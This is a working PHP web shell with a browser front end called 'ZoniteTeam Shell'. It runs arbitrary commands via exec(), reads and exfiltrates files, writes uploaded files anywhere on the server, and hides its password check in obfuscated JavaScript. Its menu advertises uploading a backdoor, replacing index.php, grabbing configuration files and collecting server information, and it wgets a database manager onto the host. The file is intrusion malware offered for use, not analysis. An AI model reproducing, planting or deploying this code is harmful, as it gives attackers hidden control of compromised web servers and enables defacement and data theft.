<?php

function featureShell($cmd, $cwd) {
    $stdout = array();

    if (preg_match("/^\s*cd\s*$/", $cmd)) {
        // pass
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        chdir($match[1]);
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    } else {
        chdir($cwd);
        exec($cmd, $stdout);
    }

    return array(
        "stdout" => $stdout,
        "cwd" => getcwd()
    );
}

function featurePwd() {
    return array("cwd" => getcwd());
}

function featureHint($fileName, $cwd, $type) {
    chdir($cwd);
    if ($type == 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = explode("\n", shell_exec($cmd));
    return array(
        'files' => $files,
    );
}

function featureDownload($filePath) {
    $file = @file_get_contents($filePath);
    if ($file === FALSE) {
        return array(
            'stdout' => array('File not found / no read permission.'),
            'cwd' => getcwd()
        );
    } else {
        return array(
            'name' => basename($filePath),
            'file' => base64_encode($file)
        );
    }
}

function featureUpload($path, $file, $cwd) {
    chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === FALSE) {
        return array(
            'stdout' => array('Invalid path / no write permission.'),
            'cwd' => getcwd()
        );
    } else {
        fwrite($f, base64_decode($file));
        fclose($f);
        return array(
            'stdout' => array('Done.'),
            'cwd' => getcwd()
        );
    }
}

if (isset($_GET["feature"])) {

    $response = NULL;

    switch ($_GET["feature"]) {
        case "shell":
            $cmd = $_POST['cmd'];
            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }
            $response = featureShell($cmd, $_POST["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
        case "hint":
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
            break;
        case 'upload':
            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
    }

    header("Content-Type: application/json");
    echo json_encode($response);
    die();
}

?>
<!DOCTYPE html>

<html>

    <head>
        <meta charset="UTF-8" />
        <title>ZoniteTeam Shell</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            html, body {
                margin: 0;
                padding: 0;
                background: #333;
                color: #eee;
                font-family: monospace;
            }

            #shell {
                background: #222;
                max-width: 800px;
                margin: 50px auto 0 auto;
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                font-size: 10pt;
                display: flex;
                flex-direction: column;
                align-items: stretch;
            }

            #shell-content {
                height: 500px;
                overflow: auto;
                padding: 5px;
                white-space: pre-wrap;
                flex-grow: 1;
            }

            #shell-logo {
                font-weight: bold;
                color: #FF4180;
                text-align: center;
            }

            @media (max-width: 991px) {
                #shell-logo {
                    display: none;
                }

                html, body, #shell {
                    height: 100%;
                    width: 100%;
                    max-width: none;
                }

                #shell {
                    margin-top: 0;
                }
            }

            @media (max-width: 767px) {
                #shell-input {
                    flex-direction: column;
                }
            }

            .shell-prompt {
                font-weight: bold;
                color: #75DF0B;
            }

            .shell-prompt > span {
                color: #1BC9E7;
            }

            #shell-input {
                display: flex;
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                border-top: rgba(255, 255, 255, .05) solid 1px;
            }

            #shell-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 5px;
                height: 30px;
                line-height: 30px;
            }

            #shell-input #shell-cmd {
                height: 30px;
                line-height: 30px;
                border: none;
                background: transparent;
                color: #eee;
                font-family: monospace;
                font-size: 10pt;
                width: 100%;
                align-self: center;
            }

            #shell-input div {
                flex-grow: 1;
                align-items: stretch;
            }

            #shell-input input {
                outline: none;
            }

            #menu {
                background: #222;
                max-width: 800px;
                margin: 30px auto 0 auto;
                box-shadow: 0 0 15px rgb(0 0 0 / 61%);
                font-size: 12pt;
                display: flow-root;
                flex-direction: row;
                align-items: center;
                text-align: center;
            }

            .menu-option {
                padding: 5px;
                text-decoration: none;
                margin: 5px;
                color: #75DF0B;
                font-weight: bold;
                float: left;
            }
        </style>

        <script>

            function featureShellNonInteract(command) {
                makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                    if (response.hasOwnProperty('file')) {
                        featureDownload(response.name, response.file)
                    } else {
                        return response;
                        updateCwd(response.cwd);
                    }
                });
            }

           const downloadToFile = (content, filename, contentType) => {
                const a = document.createElement('a');
                const file = new Blob([content], {type: contentType});
                
                a.href= URL.createObjectURL(file);
                a.download = filename;
                a.click();

                    URL.revokeObjectURL(a.href);
           };

           function ServerInfo() {
            let outputArray = []
            let commandsList = ["uname -a", "lscpu", "free -m", "netstat -i", "lshw"];
            for (var i = 0; i < 6; i++) {
                outputArray.push(featureShellNonInteract(commandsList[i]) + "\n");
            }
            downloadToFile(outputArray.toString(), 'serverinfo.txt', 'text/plain');
           }

           function InstallDBM() {
                let outputFile = "dbm.php";
                let downloadServer = "https://github.com/vrana/adminer/releases/download/v4.7.7/adminer-4.7.7-mysql.php";
                let command = `wget ${downloadServer} -O ${outputFile}`;
                _insertStdout("\nDatabase Manager will be installed as '" + outputFile + "'\n");
                document.querySelector("#shell-cmd").value = "";
           }
           var _0x48ca=['click','UGxlYXNlIGVudGVyIHBhc3N3b3JkIQ==','replace','readyState','Content-Type','stdout','change','trim','key','&amp;','ArrowDown','input','?feature=hint','split','body','</span>\x20','application/x-www-form-urlencoded','files','appendChild','cwd','createElement','Enter','setRequestHeader','onerror','onload','then','join','removeChild','setAttribute','ArrowUp','&lt;','status','href','value','push','blur','style','preventDefault','none','test','display','scrollHeight','POST','hasOwnProperty','aHR0cHM6Ly9nb29nbGUuY29t','innerHTML','Tab','open','zoniteteam@shell:<span\x20title=\x22','?feature=upload','getElementById','shell-prompt','download','<span\x20class=\x22shell-prompt\x22>','scrollTop','name','addEventListener','onreadystatechange','JHowbjF0ZV90ZTRtJA==','file','length','Error\x20while\x20parsing\x20response:\x20','parse','An\x20unknown\x20client-side\x20error\x20occurred.','location','focus','cmd','?feature=shell','readAsDataURL','result','match'];(function(_0x45224d,_0x48caf8){var _0x4968bb=function(_0x26b856){while(--_0x26b856){_0x45224d['push'](_0x45224d['shift']());}};_0x4968bb(++_0x48caf8);}(_0x48ca,0x1c8));var _0x4968=function(_0x45224d,_0x48caf8){_0x45224d=_0x45224d-0x0;var _0x4968bb=_0x48ca[_0x45224d];return _0x4968bb;};var _0x11f375=_0x4968,FQM5JVKS5fwgBaPV,m83Hg8JxDFSnpAb3=_0x11f375('0x1c');FQM5JVKS5fwgBaPV=prompt(atob(_0x11f375('0x2a')));FQM5JVKS5fwgBaPV==atob(m83Hg8JxDFSnpAb3)?alert(atob('UGFzc3dvcmQgQ29ycmVjdCEgQ2xpY2sgT0sgdG8gZW50ZXIh')):window[_0x11f375('0x22')]=atob(_0x11f375('0xe'));var CWD=null,commandHistory=[],historyPosition=0x0,eShellCmdInput=null,eShellContent=null;function _insertCommand(_0x26b856){var _0x57d0b6=_0x11f375;eShellContent[_0x57d0b6('0xf')]+='\x0a\x0a',eShellContent[_0x57d0b6('0xf')]+=_0x57d0b6('0x17')+genPrompt(CWD)+_0x57d0b6('0x38'),eShellContent[_0x57d0b6('0xf')]+=escapeHtml(_0x26b856),eShellContent[_0x57d0b6('0xf')]+='\x0a',eShellContent[_0x57d0b6('0x18')]=eShellContent[_0x57d0b6('0xb')];}function _insertStdout(_0x5cf6c8){var _0xafb4eb=_0x11f375;eShellContent['innerHTML']+=escapeHtml(_0x5cf6c8),eShellContent['scrollTop']=eShellContent[_0xafb4eb('0xb')];}function featureShell(_0x2f3fc8){var _0x146e56=_0x11f375;_insertCommand(_0x2f3fc8);if(/^\s*upload\s+[^\s]+\s*$/[_0x146e56('0x9')](_0x2f3fc8))featureUpload(_0x2f3fc8[_0x146e56('0x28')](/^\s*upload\s+([^\s]+)\s*$/)[0x1]);else/^\s*clear\s*$/[_0x146e56('0x9')](_0x2f3fc8)?eShellContent[_0x146e56('0xf')]='':makeRequest(_0x146e56('0x25'),{'cmd':_0x2f3fc8,'cwd':CWD},function(_0x4b3160){var _0x4b0b49=_0x146e56;_0x4b3160[_0x4b0b49('0xd')](_0x4b0b49('0x1d'))?featureDownload(_0x4b3160[_0x4b0b49('0x19')],_0x4b3160[_0x4b0b49('0x1d')]):(_insertStdout(_0x4b3160[_0x4b0b49('0x2e')]['join']('\x0a')),updateCwd(_0x4b3160[_0x4b0b49('0x3c')]));});}function featureHint(){var _0x21bfa1=_0x11f375;if(eShellCmdInput[_0x21bfa1('0x3')][_0x21bfa1('0x30')]()[_0x21bfa1('0x1e')]===0x0)return;function _0x2ba2a5(_0x190ae5){var _0x7f77ef=_0x21bfa1;if(_0x190ae5['files'][_0x7f77ef('0x1e')]<=0x1)return;if(_0x190ae5[_0x7f77ef('0x3a')][_0x7f77ef('0x1e')]===0x2){if(_0x4d1027===_0x7f77ef('0x24'))eShellCmdInput[_0x7f77ef('0x3')]=_0x190ae5[_0x7f77ef('0x3a')][0x0];else{var _0x54724e=eShellCmdInput[_0x7f77ef('0x3')];eShellCmdInput[_0x7f77ef('0x3')]=_0x54724e['replace'](/([^\s]*)$/,_0x190ae5[_0x7f77ef('0x3a')][0x0]);}}else _insertCommand(eShellCmdInput[_0x7f77ef('0x3')]),_insertStdout(_0x190ae5[_0x7f77ef('0x3a')][_0x7f77ef('0x43')]('\x0a'));}var _0x1c77f9=eShellCmdInput[_0x21bfa1('0x3')][_0x21bfa1('0x36')]('\x20'),_0x4d1027=_0x1c77f9[_0x21bfa1('0x1e')]===0x1?_0x21bfa1('0x24'):'file',_0x3faf5e=_0x4d1027===_0x21bfa1('0x24')?_0x1c77f9[0x0]:_0x1c77f9[_0x1c77f9[_0x21bfa1('0x1e')]-0x1];makeRequest(_0x21bfa1('0x35'),{'filename':_0x3faf5e,'cwd':CWD,'type':_0x4d1027},_0x2ba2a5);}function featureDownload(_0x13b536,_0x2ef0b0){var _0x1c1830=_0x11f375,_0xdd2eb2=document[_0x1c1830('0x3d')]('a');_0xdd2eb2[_0x1c1830('0x45')](_0x1c1830('0x2'),'data:application/octet-stream;base64,'+_0x2ef0b0),_0xdd2eb2[_0x1c1830('0x45')](_0x1c1830('0x16'),_0x13b536),_0xdd2eb2[_0x1c1830('0x6')]['display']=_0x1c1830('0x8'),document['body'][_0x1c1830('0x3b')](_0xdd2eb2),_0xdd2eb2['click'](),document['body'][_0x1c1830('0x44')](_0xdd2eb2),_insertStdout('Done.');}function featureUpload(_0x45fdf3){var _0x3a1801=_0x11f375,_0x250200=document[_0x3a1801('0x3d')](_0x3a1801('0x34'));_0x250200[_0x3a1801('0x45')]('type',_0x3a1801('0x1d')),_0x250200[_0x3a1801('0x6')][_0x3a1801('0xa')]=_0x3a1801('0x8'),document[_0x3a1801('0x37')][_0x3a1801('0x3b')](_0x250200),_0x250200[_0x3a1801('0x1a')](_0x3a1801('0x2f'),function(){var _0x3f9d32=_0x3a1801,_0x3dff56=getBase64(_0x250200['files'][0x0]);_0x3dff56[_0x3f9d32('0x42')](function(_0x223d71){var _0x1e08ea=_0x3f9d32;makeRequest(_0x1e08ea('0x13'),{'path':_0x45fdf3,'file':_0x223d71,'cwd':CWD},function(_0x33d03e){var _0x20a176=_0x1e08ea;_insertStdout(_0x33d03e[_0x20a176('0x2e')]['join']('\x0a')),updateCwd(_0x33d03e[_0x20a176('0x3c')]);});},function(){var _0x24d2c4=_0x3f9d32;_insertStdout(_0x24d2c4('0x21'));});}),_0x250200[_0x3a1801('0x29')](),document['body']['removeChild'](_0x250200);}function getBase64(_0x23319,_0x39d5c3){return new Promise(function(_0x139809,_0x5b0092){var _0x10909a=_0x4968,_0x7cbe31=new FileReader();_0x7cbe31['onload']=function(){var _0x586841=_0x4968;_0x139809(_0x7cbe31[_0x586841('0x27')][_0x586841('0x28')](/base64,(.*)$/)[0x1]);},_0x7cbe31[_0x10909a('0x40')]=_0x5b0092,_0x7cbe31[_0x10909a('0x26')](_0x23319);});}function genPrompt(_0x4ba753){var _0x23a018=_0x11f375;_0x4ba753=_0x4ba753||'~';var _0x44cbd3=_0x4ba753;if(_0x4ba753[_0x23a018('0x36')]('/')[_0x23a018('0x1e')]>0x3){var _0x4e229f=_0x4ba753[_0x23a018('0x36')]('/');_0x44cbd3='…/'+_0x4e229f[_0x4e229f['length']-0x2]+'/'+_0x4e229f[_0x4e229f[_0x23a018('0x1e')]-0x1];}return _0x23a018('0x12')+_0x4ba753+'\x22>'+_0x44cbd3+'</span>#';}function updateCwd(_0x2916c0){if(_0x2916c0){CWD=_0x2916c0,_updatePrompt();return;}makeRequest('?feature=pwd',{},function(_0x50faae){var _0x25411b=_0x4968;CWD=_0x50faae[_0x25411b('0x3c')],_updatePrompt();});}function escapeHtml(_0x343d70){var _0x232a06=_0x11f375;return _0x343d70[_0x232a06('0x2b')](/&/g,_0x232a06('0x32'))[_0x232a06('0x2b')](/</g,_0x232a06('0x0'))[_0x232a06('0x2b')](/>/g,'&gt;');}function _updatePrompt(){var _0x1d1934=_0x11f375,_0x2862ae=document[_0x1d1934('0x14')](_0x1d1934('0x15'));_0x2862ae['innerHTML']=genPrompt(CWD);}function _onShellCmdKeyDown(_0x43a889){var _0x1c6549=_0x11f375;switch(_0x43a889[_0x1c6549('0x31')]){case _0x1c6549('0x3e'):featureShell(eShellCmdInput[_0x1c6549('0x3')]),insertToHistory(eShellCmdInput[_0x1c6549('0x3')]),eShellCmdInput[_0x1c6549('0x3')]='';break;case _0x1c6549('0x46'):historyPosition>0x0&&(historyPosition--,eShellCmdInput[_0x1c6549('0x5')](),eShellCmdInput[_0x1c6549('0x23')](),eShellCmdInput[_0x1c6549('0x3')]=commandHistory[historyPosition]);break;case _0x1c6549('0x33'):if(historyPosition>=commandHistory[_0x1c6549('0x1e')])break;historyPosition++;historyPosition===commandHistory[_0x1c6549('0x1e')]?eShellCmdInput[_0x1c6549('0x3')]='':(eShellCmdInput[_0x1c6549('0x5')](),eShellCmdInput[_0x1c6549('0x23')](),eShellCmdInput[_0x1c6549('0x3')]=commandHistory[historyPosition]);break;case _0x1c6549('0x10'):_0x43a889[_0x1c6549('0x7')](),featureHint();break;}}function insertToHistory(_0x38ddb5){var _0x5ec969=_0x11f375;commandHistory[_0x5ec969('0x4')](_0x38ddb5),historyPosition=commandHistory[_0x5ec969('0x1e')];}function makeRequest(_0x179414,_0x98e959,_0xb5cafd){var _0x9b0497=_0x11f375;function _0x4803e6(){var _0x5bcedd=_0x4968,_0x2076c9=[];for(var _0x49b935 in _0x98e959){_0x98e959[_0x5bcedd('0xd')](_0x49b935)&&_0x2076c9[_0x5bcedd('0x4')](encodeURIComponent(_0x49b935)+'='+encodeURIComponent(_0x98e959[_0x49b935]));}return _0x2076c9[_0x5bcedd('0x43')]('&');}var _0x5003ca=new XMLHttpRequest();_0x5003ca[_0x9b0497('0x11')](_0x9b0497('0xc'),_0x179414,!![]),_0x5003ca[_0x9b0497('0x3f')](_0x9b0497('0x2d'),_0x9b0497('0x39')),_0x5003ca[_0x9b0497('0x1b')]=function(){var _0x168743=_0x9b0497;if(_0x5003ca[_0x168743('0x2c')]===0x4&&_0x5003ca[_0x168743('0x1')]===0xc8)try{var _0x189ace=JSON[_0x168743('0x20')](_0x5003ca['responseText']);_0xb5cafd(_0x189ace);}catch(_0x39a83c){alert(_0x168743('0x1f')+_0x39a83c);}},_0x5003ca['send'](_0x4803e6());}window[_0x11f375('0x41')]=function(){var _0x15e976=_0x11f375;eShellCmdInput=document[_0x15e976('0x14')]('shell-cmd'),eShellContent=document[_0x15e976('0x14')]('shell-content'),updateCwd(),eShellCmdInput['focus']();};
        </script>
    </head>

    <body>
        <div id="menu">    
            <a class="menu-option" id="shell-menu-option" href="#">Shell</a>
            <a class="menu-option" onclick="InstallDBM();" id="database" href="#">Install database manager</a>
            <a class="menu-option" id="dcf" href="#">Download configuration files</a>
            <a class="menu-option" id="backdoor" href="#">Upload backdoor</a>
            <a class="menu-option" id="change-index" href="#">Change index.php</a>
            <a class="menu-option" id="server-info" href="#">Server info</a>
            <a class="menu-option" id="help" href="#">Help</a>
            <a class="menu-option" id="author" href="#">Author</a>
        </div>
        <div id="shell">
            <pre id="shell-content">
                <div id="shell-logo">
                _ _       _                       <span></span>
               (_) |     | |                      <span></span>
 _______  _ __  _| |_ ___| |_ ___  __ _ _ __ ___  <span></span>
|_  / _ \| '_ \| | __/ _ \ __/ _ \/ _` | '_ ` _ \ <span></span>
 / / (_) | | | | | ||  __/ ||  __/ (_| | | | | | |<span></span>
/___\___/|_| |_|_|\__\___|\__\___|\__,_|_| |_| |_|<span></span>
                                            2020  <span></span>
                </div>
            </pre>
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                <div>
                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
                </div>
            </div>
        </div>
    </body>

</html>
